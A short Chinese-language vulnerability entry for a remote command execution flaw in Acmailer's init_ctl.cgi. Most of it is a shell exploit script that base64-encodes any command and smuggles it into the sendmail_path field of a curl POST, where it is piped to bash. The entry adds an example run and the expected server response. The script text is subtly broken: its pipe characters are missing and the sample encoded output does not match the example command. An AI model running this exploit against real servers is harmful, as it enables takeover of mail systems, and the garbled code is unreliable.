# Acmailer邮件系统init_ctl.cgi远程命令执行漏洞

- **系统**：Acmailer　|　**类型**：命令执行　|　**CVE**：—

**请求体 / payload**
```
host=$1
command=$2
base=$(echo "$command"  base64)
echo 'make sure the output does not contain + or =:'
echo $base
/usr/bin/curl -s -k -X 'POST' --data-binary "admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=echo $base  base64 -d  bash&homeurl=http%3A%2F%2F&mypath=e" "${host}init_ctl.cgi"
sh http://ip/acmailer/ 'touch /tmp/pwned'
成功则输出：
make sure the output does not contain + or =:
dG91Y2gK
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="index.cgi">here</a>.</p>
<hr>
<a…（脚本共 688 字，完整版见原文）
```